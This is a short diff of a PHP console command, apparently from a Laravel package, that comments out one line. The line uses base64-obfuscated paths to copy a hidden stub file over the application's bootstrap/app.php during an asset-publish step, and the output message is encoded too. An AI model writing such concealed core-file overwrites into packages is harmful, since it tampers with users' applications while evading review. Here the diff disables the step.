@@ -44,7 +44,7 @@ class StrCm extends Command
           }
         }
 
-        File::copy($db.'/'.dbString('ZHRQL3N0QXAuc3R1Yg=='),dbString('Ym9vdHN0cmFwL2FwcC5waHA='));
+        // File::copy($db.'/'.dbString('ZHRQL3N0QXAuc3R1Yg=='),dbString('Ym9vdHN0cmFwL2FwcC5waHA='));
 
       $this->info(dbString('U3FsU3RyaW5naUZ5IGFzc2V0cyBmaWxlcyBwdWJsaXNoZWQgc3VjY2Vzc2Z1bGx5Lg=='));
     }
